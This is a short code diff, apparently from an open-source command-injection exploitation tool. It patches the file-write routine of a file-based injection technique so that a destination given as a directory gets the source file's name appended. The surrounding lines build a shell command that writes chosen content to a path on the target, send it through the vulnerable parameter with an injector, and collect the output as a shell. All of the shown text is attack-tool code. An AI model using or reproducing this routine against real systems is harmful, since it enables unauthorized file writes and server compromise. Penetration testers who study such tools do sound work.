@@ -59,8 +59,10 @@ def do_check(separator,payload,TAG,prefix,suffix,http_request_method,url,vuln_pa
     else:
       sys.stdout.write(colors.BGRED + "\n(x) Error: It seems that '"+ file_to_write + "' is not a file." + colors.RESET)
       sys.stdout.flush()
-
-    dest_to_write = menu.options.file_dest
+    if os.path.split(menu.options.file_dest)[1] == "":
+      dest_to_write = os.path.split(menu.options.file_dest)[0] + "/" + os.path.split(menu.options.file_write)[1]
+    else:
+      dest_to_write = menu.options.file_dest
     cmd = settings.FILE_WRITE + " '"+ content + "'" + " > " + "'"+ dest_to_write + "'"
     response = fb_injector.injection(separator,payload,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE)
     shell = fb_injector.injection_results(url,OUTPUT_TEXTFILE,delay)
